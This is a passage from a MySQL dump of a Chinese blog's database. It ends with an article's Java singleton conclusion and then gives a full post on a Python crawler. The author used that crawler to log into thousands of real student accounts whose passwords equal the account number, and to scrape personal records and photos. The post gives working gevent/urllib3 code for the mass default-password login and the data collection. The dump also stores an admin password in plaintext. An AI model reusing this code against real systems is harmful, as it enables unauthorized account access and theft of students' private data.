使用反射创建它的实例时\r\n> 3. 子类被加载时，如果父类还没被加载，就先加载父类\r\n> 4. jvm启动时执行的主类会首先被加载\r\n\r\n## 适用场景\r\n\r\n>* 类只能有一个实例而且客户可以从一个众所周知的访问点访问它\r\n>* 这个唯一实例应该是通过子类化可扩展的， 并且客户应该无需更改代码就能使用一个扩展的实例\r\n\r\n## 总结\r\nOK，看到这里，你还会觉得单例模式是最简单的设计模式了么？再回头看一下你之前代码中的单例实现，觉得是无懈可击的么？\r\n可能我们在实际的开发中，对单例的实现并没有那么严格的要求。比如，我如果能保证所有的getInstance都是在一个线程的话，那其实第一种最简单的教科书方式就够用了。再比如，有时候，我的单例变成了多例也可能对程序没什么太大影响……\r\n但是，如果我们能了解更多其中的细节，那么如果哪天程序出了些问题，我们起码能多一个排查问题的点。早点解决问题，就能早点回家吃饭……:-D\r\n\r\n—— 还有，完美的方案是不存在，任何方式都会有一个『度』的问题。比如，你的觉得代码已经无懈可击了，但是因为你用的是JAVA语言，可能ClassLoader有些BUG啊……你的代码谁运行在JVM上的，可能JVM本身有BUG啊……你的代码运行在手机上，可能手机系统有问题啊……你生活在这个宇宙里，可能宇宙本身有些BUG啊……o(╯□╰)o\r\n所以，尽力做到能做到的最好就行了。\r\n\r\n—— 感谢你花费了不少时间看到这里，但愿你没有觉得虚度。\r\n\r\n\r\n## 开源项目\r\n本人创建的关于各种设计模式的开源项目：[Java 实现的面向对象软件设计模式](https://github.com/JamesZBL/java_design_patterns)  ，如果觉得有用，欢迎 Star/Fork/提Issue。该项目目前处在开发阶段。\r\n\r\n原文链接：[Hi，我们再来聊一聊Java的单例吧](https://zhuanlan.zhihu.com/p/31007589)','2017-12-09 18:07:40','2017-12-09 18:07:40'),(24,'Python 爬虫','你的',0,'## 初衷\r\n**本文旨在提醒同学们及时修改密码，增强保护个人隐私的意识，因此代码中一些关键数据以及校名等信息不会公开！复制粘贴文章中的代码不会爬到任何东西。只是作为学习 Python 爬虫的一点总结而已！**\r\n\r\n作者所在学校的教务系统安全防范措施可谓非常不严密，学生登录甚至不需要图形验证码。每年学生入学之后，学校下发的账号，初始密码不是无规律的，而是和账号完全一致！如果学生不及时修改密码，那么其他人可以轻松登录他的账号。登录后可以看到学生的学籍信息，包括高考报名时照片，家长联系方式等，联系地址甚至详细到几单元几楼几号门，**个人信息泄露情况非常严重！**\r\n\r\n## 结果\r\n先说结果。经过两天连写带调试，终于完成了对全校本科生 17400 多个在网账号的测试，其中有 12600 多个账号使用的还是初始密码。此处隐去校名，统计结果如下：\r\n\r\n| 序号 | 学院 | 年级 | 在网账号 | 可爬账号 | 年级占比 |\r\n| :-: | :-: | :-: | :-: | :-: | :-: |\r\n|1   |本一   |2014   |3157   |1998   |63.29%   |\r\n|2   |本一   |2015   |3328   |2234   |67.13%   |\r\n|3   |本一   |2016   |3641   |3066   |84.21%   |\r\n|4   |本一   |2017   |3497   |3326   |95.11%   |\r\n|5   |本三   |2014   |1759   |303   |17.23%   |\r\n|6   |本三    |2015   |1643   |620   |37.74%   |\r\n|7   |本三    |2016   |1605   |1434   |89.35%   |\r\n|8   |本三    |2017   |1552   |639   |41.17%   |\r\n\r\n**介于初衷，只爬了 10 个账号的信息，以示严重性！**\r\n\r\n![爬到的学籍信息](http://upload-images.jianshu.io/upload_images/7134080-ec8c310143b69f21.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n## 过程\r\n本人之前做过近 2 年的 Java 相关开发，对 HTTP 协议中常用的知识了解一些，再加上 Python 出了名的简洁易用，因此入门还是比较轻松的。去年有一段时间研究过一阵子 Python，使用的是 Scrapy 框架，所以这一次我也首先想到了 Scrapy。\r\n\r\nScrapy 这种框架适用的情形是：已经获取了需要爬取的页面的一系列 URL ，或者 URL 是成一定规律变化的，不需要登录或者登录一次拿到 Cookie 就可以拿着这个 Cookie 一直用了。但是教务系统完全相反，它需要每次都进行登录，也许 Scrapy 有办法，但也不会太简单，索性自己写。\r\n\r\n这套教务系统虽然安全性不怎么样，但也已是一套成熟的产品了，功能和稳定性上还是很不错的。\r\n\r\n![系统的登录界面](http://upload-images.jianshu.io/upload_images/7134080-286f834fd46caf89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n首先使用 Firefox 浏览器的开发者工具查看 HTTP 通信的一些信息：\r\n\r\n![登录请求 ( POST )](http://upload-images.jianshu.io/upload_images/7134080-3ab0ec0d031193cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n登录表单通过 POST 请求进行提交，参数是账号和密码，发送的也是明文\r\n\r\n![表单参数](http://upload-images.jianshu.io/upload_images/7134080-986180eedc73180d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n服务器返回的响应中 Set-Cookie 就相当于给用户下发的令牌，用户下一次请求的时候带上这块令牌，服务器就能认出来这个用户是否刚登录过。这个令牌是有时间限制的，每次请求都会刷新一次时间，如果两次请求之间间隔时间超过设定值，那么服务器就不认识用户了，这次会话就结束了，需要重新登录。\r\n\r\n![登录的响应体](http://upload-images.jianshu.io/upload_images/7134080-d14eaf5437d7dfc4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n刚开始使用的是 requests ，用 for 循环实现，由于 requests 是同步的，所以效率很低，还会经常卡死。后来改成了协程，用的 gevent + urllib3，效率提升了上百倍。解析 HTML 用的 lxml 的 etree，图片的保存用 PIL 的 Image。\r\n\r\n先引入依赖\r\n```\r\nimport sys\r\nimport logging\r\nimport gevent\r\nimport urllib3\r\nimport pathlib\r\nfrom PIL import Image\r\nfrom io import BytesIO\r\nfrom lxml import etree\r\n```\r\n创建 HTTP 连接池\r\n```\r\nhttp = urllib3.HTTPConnectionPool(\r\n	host=settings.SERVER_HOST,\r\n	port=settings.SERVER_PORT,\r\n	strict=False,\r\n	maxsize=100,\r\n	block=False,\r\n	retries=100,\r\n	timeout=10\r\n)\r\n```\r\n\r\n请求头的一些固定信息可以预先设定好，伪装浏览器\r\n```\r\nheader = {\'Accept\': \'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\',\r\n	\'Accept-Encoding\': \'gzip, deflate\',\r\n	\'Accept-Language\': \'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\',\r\n	\'Cache-Control\': \'max-age=0\',\r\n	\'Connection\': \'Keep-alive\',\r\n	\'Host\': settings.SERVER_HOST,\r\n	\'Upgrade-Insecure-Requests\': \'1\',\r\n	\'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0\'\r\n}\r\n```\r\n登录并验证是否是初始密码\r\n```\r\n# 账号校验器\r\nclass InfoValidate(object):\r\n	def __init__(self):\r\n		self.logger = InfoMain.logger\r\n		self.http = InfoMain.http\r\n		# 有效账号\r\n		self.account_valid = []\r\n		# 可爬账号\r\n		self.account_available = []\r\n\r\n	def validate(self, all_account):\r\n		# 将所有校验过程加入队列\r\n		jobs = [gevent.spawn(self.validate_account, self.http, a) for a in all_account]\r\n		gevent.joinall(jobs, timeout=0)\r\n\r\n	def validate_account(self, http, account):\r\n		# 登录请求参数\r\n		param = {\"zjh\": account, \"mm\": account}\r\n		header = headers.header\r\n		response = http.request(\'POST\', settings.URL_LOGIN, fields=param, headers=header)\r\n		self.logger.info(\'发送请求>>{}\'.format(param))\r\n		self.logger.info(response.status)\r\n		# 响应体解码\r\n		res_text = response.data.decode(\'GB2312\', \'ignore\')\r\n\r\n		if res_text.find(\'密码不正确\') > -1:\r\n			# 密码有误\r\n			self.account_valid.append(account)\r\n		elif not res_text.find(\'证件号不存在\') > -1:\r\n			# 账号可爬\r\n			self.account_available.append(account)\r\n			self.account_valid.append(account)\r\n			self.logger.info(\"账号可用>>>{}\".format(account))\r\n```\r\n至此已经获取了所有初始密码未修改的账号了，下面研究一下，要爬取的学籍信息页的规律\r\n\r\n![学籍信息页](http://upload-images.jianshu.io/upload_images/7134080-974fdb14f78e7210.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n\r\n![table 的结构](http://upload-images.jianshu.io/upload_images/7134080-ed103827cea8be42.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\r\n\r\n一系列的信息都包裹在 ```<td width = \"275\"></td> ```之间，对应的 xpath 表达式即为 ```//td[starts-with(@width,\"275\")]/text()```\r\n\r\n基于之前对账号的测试，爬取学籍信息\r\n\r\n```\r\n# 信息收集器\r\nclass InfoCollect(object):\r\n	def __init__(self):\r\n		self.logger = InfoMain.logger\r\n		self.http = InfoMain.http\r\n		# 功能模块\r\n		self.mod_get_roll_info = settings.MOD_ROLL_INFO\r\n		self.mod_get_roll_img = settings.MOD_ROLL_IMG\r\n\r\n	def get_info_queue(self, accounts):\r\n		# 将所有信息收集过程加入队列\r\n		jobs = [gevent.spawn(self.get_info, a) for a in accounts]\r\n		gevent.joinall(jobs, timeout=0)\r\n\r\n	def get_info(self, stuid):\r\n		# 登录\r\n		param = {\'zjh\': stuid, \'mm\': stuid}\r\n		response = self.http.request(\'POST\', settings.URL_LOGIN, fields=param)\r\n		# 保存 Cookie\r\n		cookie = response.headers[\'Set-Cookie\'].replace(\'; path=/\', \'\')\r\n		header = headers.header\r\n		header[\'cookie\'] = cookie\r\n		# 学籍信息\r\n		if self.mod_get_roll_info:\r\n			# 带 Cookie 访问学籍信息页\r\n			response_xjxx = self.http.request(\'GET\', settings.URL_XJXX, headers=header)\r\n			text = response_xjxx.data.decode(\'GB2312\', \'ignore\')\r\n			# 解析页面内容\r\n			selector = etree.HTML(text)\r\n			text_arr = selector.xpath(\'//td[starts-with(@width,\"275\")]/text()\')\r\n			# 学籍信息\r\n			result = []\r\n			for info in text_arr:\r\n				result.append(info.strip())\r\n			self.save_info(result)\r\n		# 学籍照片\r\n		if self.mod_get_roll_img:\r\n			response_xjzp = self.http.request(\'GET\', settings.URL_XJZP, headers=header)\r\n			image = Image.open(BytesIO(response_xjzp.data))\r\n			setpath = settings.PATH_IMG_SAVE\r\n			path = pathlib.Path(setpath)\r\n			if not path.exists():\r\n				path.mkdir()\r\n			setpath = setpath + \'/\' + stuid + \'.jpg\'\r\n			image.save(setpath)\r\n			self.logger.info(\'保存照片>>>{}\'.format(setpath))\r\n\r\n		# 登出\r\n		self.http.request(\'POST\', settings.URL_LOGOUT, headers=header)\r\n```\r\n\r\n至此，已经实现了所有信息的获取以及照片的保存。\r\n\r\n没改密码的同学们应该看到了，获取个人信息其实很简单，关键在于增强自己保护个人信息的意识。','2018-02-11 11:43:27','2018-02-11 12:01:51');

/*Table structure for table `category` */

DROP TABLE IF EXISTS `category`;

CREATE TABLE `category` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) DEFAULT NULL,
  `display_name` varchar(64) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;

/*Data for the table `category` */

insert  into `category`(`id`,`name`,`display_name`) values (1,'firstPage','firstPage'),(2,'jottings','jottings'),(3,'excerpt ','excerpt ');

/*Table structure for table `user` */

DROP TABLE IF EXISTS `user`;

CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

/*Data for the table `user` */

insert  into `user`(`id`,`username`,`password`) values (1,'ak','123456');

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
